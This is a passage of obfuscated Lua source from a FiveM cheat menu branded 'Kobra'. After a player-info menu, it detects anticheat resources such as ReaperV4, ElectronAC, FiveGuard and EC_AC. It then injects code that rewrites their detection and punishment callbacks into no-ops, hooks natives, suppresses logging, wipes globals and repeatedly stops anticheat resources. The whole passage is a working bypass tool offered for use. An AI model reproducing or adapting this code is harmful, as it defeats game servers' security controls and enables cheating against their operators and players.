17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v665))),color="0, 132, 255"},{key="Weapon",value=v28[v843] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665)))~=(853 -(406 + 447))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v665)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v665))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v665))) * (10.6 -7) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v665))) and "Visible") or "Invisible" }},onSelect=function(v904) v27[v665]=v904 or false ;end};end end end for v509,v510 in pairs(v27) do local v511=0;local v512;while true do if (v511==1) then if  not v512 then v27[v509]=nil;end break;end if (v511==0) then v512=false;for v845,v846 in ipairs(v318) do if (tonumber(v846.serverId)==tonumber(v509)) then v512=true;break;end end v511=987 -(968 + 18) ;end end end v15=math.min(v15 or 1 ,math.max(1 + 0 , #v316.tabs));local v320,v321=pcall(function() v315:UpdateElements(v17);end);if  not v320 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v321) );end end;v12.AssignListMenuActions=function(v322) local v323=0 + 0 ;while true do if (v323==(0 -0)) then if  not v16 then return;end for v744,v745 in ipairs(v16) do if ((v745.label=="Server") and v745.categories) then for v1014,v1015 in ipairs(v745.categories) do if ((v1015.label=="List") and v1015.tabs) then for v1177,v1178 in ipairs(v1015.tabs) do if (v1178.type=="button") then if (v1178.label=="Select Everyone") then v1178.onSelect=function() v12:SelectEveryone();end;elseif (v1178.label=="Un-Select Everyone") then v1178.onSelect=function() v12:UnselectEveryone();end;elseif (v1178.label=="Clear Selection") then v1178.onSelect=function() v12:ClearSelection();end;end end end end end end end break;end end end;CreateThread(function() while true do local v513=0;while true do if (0==v513) then Wait(1767 -(172 + 95) );if (v12:InListMenu() and v13) then local v907=0 -0 ;local v908;local v909;while true do if (v907==0) then v908,v909=pcall(function() v12:UpdateListMenu();end);if  not v908 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v909) );end break;end end end break;end end end end);Wait(1000);v12:AssignListMenuActions();local v113=nil;local v114=nil;local function v115() local v324=265 -(260 + 5) ;while true do if (v324==(0 -0)) then for v746=819 -(265 + 554) ,GetNumResources() -(1572 -(1440 + 131))  do local v747=0;local v748;local v749;while true do if (v747==(2 -1)) then if (v749 and (string.find(v749,"https://electron-services.com") or string.find(v749,"Electron Services") or string.find(v749,"The most advanced fiveM anticheat"))) then local v1136=1395 -(253 + 1142) ;while true do if (v1136==(253 -(133 + 120))) then v113=v748;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v748 );v1136=1 -0 ;end if (1==v1136) then return v748;end end end break;end if (v747==(1956 -(809 + 1147))) then v748=GetResourceByFindIndex(v746);v749=LoadResourceFile(v748,"fxmanifest.lua");v747=1;end end end return nil;end end end local function v116() local v325=497 -(178 + 319) ;while true do if ((0 -0)==v325) then for v750=0 + 0 ,GetNumResources() -1  do local v751=GetResourceByFindIndex(v750);local v752=GetNumResourceMetadata(v751,"client_script");for v847=0,v752-(1271 -(1255 + 15))  do local v848=1542 -(1221 + 321) ;local v849;while true do if (0==v848) then v849=GetResourceMetadata(v751,"client_script",v847);if (v849 and string.find(v849,"obfuscated")) then local v1179=0;while true do if (v1179==1) then return v751;end if (v1179==(0 -0)) then v114=v751;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v751 );v1179=1 + 0 ;end end end break;end end end end return nil;end end end v12.LoadBypass=function(v326) local v327=0 -0 ;local v328;local v329;while true do if (v327==(11 -8)) then Wait(455 + 545 );if (GetResourceState("ReaperV4")=="started") then local v850=0 + 0 ;while true do if (v850==(0 -0)) then MachoInjectResource2(2,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -(204 + 203) ,function(...) return false,false;end);v850=79 -(48 + 30) ;end if (3==v850) then print("ReaperV4 Bypass Enabled");v326:Notify("info","Kobra","ReaperV4 Bypass Loaded",3000);break;end if (v850==(1 + 0)) then MachoHookNative(10181871000000000000 -(1472 + 492) ,function(...) return false,3;end);MachoHookNative(12777102000000000000 -0 ,function(...) return false,true;end);v850=2 + 0 ;end if ((613 -(258 + 353))==v850) then MachoHookNative(15349248000000000000 -(1382 + 612) ,function(...) return false,0 + 0 ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);v850=1 + 2 ;end end elseif (v113~=nil) then local v1016=0;while true do if (v1016==(0 + 0)) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(5 -3 ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v114~=nil) then local v1137=0;while true do if (v1137==(0 + 0)) then CreateThread(function() while true do local v1429=119 -(35 + 84) ;while true do if (v1429==1) then Wait(2215 -(75 + 140) );break;end if (0==v1429) then MachoResourceStop(v114);print("^7[^5Kobra^7]: Stopped Resource: "   .. v114 );v1429=3 -2 ;end end end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1263=1799 -(923 + 876) ;local v1264;while true do if (v1263==(0 -0)) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1263=1;end if (v1263==(813 -(284 + 528))) then v1264={"EC_AC"};for v1485=1107 -(709 + 397) , #v1264 do local v1486=v1264[v1485];MachoInjectResource(v1486,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(3719 -2669 );end v1263=2;end if (v1263==(38 -(21 + 15))) then CreateThread(function() while true do Wait(0 -0 );MachoResourceStop("EC_AC");end end);break;end end end v327=4;end if ((0 -0)==v327) then v328={"216.146.24.88:30120","91.190.154.74:30120"};v329=GetCurrentServerEndpoint();v327=2 -1 ;end if (1==v327) then for v753,v754 in ipairs(v328) do if (v329==v754) then local v910=0 -0 ;while true do if (v910==(0 + 0)) then v326:Notify("error","Kobra","Bypass disabled for this server.",3000);return;end end end end v326:Notify("info","Kobra","Loading Anticheat Bypass...",3135 -(97 + 38) );v327=2;end if (v327==4) then if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3000);elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",3000);elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",3080 -(52 + 28) );elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",1444 + 1556 );end break;end if (v327==(851 -(59 + 790))) then v115();v116();v327=3 + 0 ;end end end;
